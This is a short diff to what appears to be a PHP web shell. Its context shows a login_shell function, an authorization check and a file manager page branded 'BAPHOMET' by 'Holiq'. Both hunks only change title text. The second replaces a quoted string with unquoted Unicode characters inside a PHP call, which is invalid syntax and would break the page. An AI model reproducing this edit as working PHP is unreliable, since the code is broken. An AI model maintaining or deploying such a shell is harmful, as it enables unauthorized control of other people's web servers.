@@ -33,7 +33,7 @@ function login_shell() {
     <meta name="theme-color" content="#343a40"/>
     <meta name="author" content="Holiq"/>
     <meta name="copyright" content="{ baphomet }"/>
-    <title>❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞</title>
+    <title> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </title>
     <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/baphomet.png"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
@@ -645,7 +645,7 @@ if ($auth['authorize']) {
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>'.__('File manager').'</title>
+<title>'.__(❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞).'</title>
 </head>
 <body>
 <form action="" method="post">
